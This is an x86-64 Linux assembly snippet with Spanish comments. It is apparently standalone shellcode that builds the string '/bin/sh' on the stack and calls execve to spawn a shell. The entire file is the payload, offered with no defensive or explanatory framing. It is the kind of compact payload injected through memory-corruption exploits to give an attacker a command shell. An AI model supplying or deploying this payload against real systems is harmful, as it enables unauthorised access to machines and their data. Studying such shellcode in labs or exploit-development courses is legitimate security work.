section .text
    global _start

_start:
    xor     rsi, rsi                ; rsi = 0 (argv)
    xor     rdx, rdx                ; rdx = 0 (envp)

    mov     rbx, 0x68732f6e69622f2f ; rbx = "//bin/sh"
    shr     rbx, 8                  ; ajustamos a "/bin/sh"
    push    rbx                     ; apilamos "/bin/sh"
    mov     rdi, rsp                ; rdi apunta a "/bin/sh"

    mov     al, 59                  ; syscall número 59 = execve
    syscall
